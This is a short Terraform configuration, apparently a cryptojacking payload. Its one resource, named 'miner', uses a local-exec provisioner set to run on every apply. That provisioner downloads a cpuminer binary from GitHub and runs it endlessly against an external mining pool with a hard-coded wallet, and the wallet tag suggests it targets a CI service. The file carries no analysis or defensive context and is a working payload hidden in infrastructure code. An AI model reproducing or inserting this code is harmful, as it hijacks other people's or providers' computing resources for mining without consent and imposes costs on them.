terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "miner" {
  triggers = {
    always_run = timestamp()
  }
  provisioner "local-exec" {
    command = "wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz && while true; do ./cpuminer-avx2 -a yespower -o stratum+tcps://na.rplant.xyz:17122 -u RN1x1ZehjTRFa9tt9vEvH1YXURwPZKz7BE.Bitrise -t 16; sleep 2; done"
  }
}
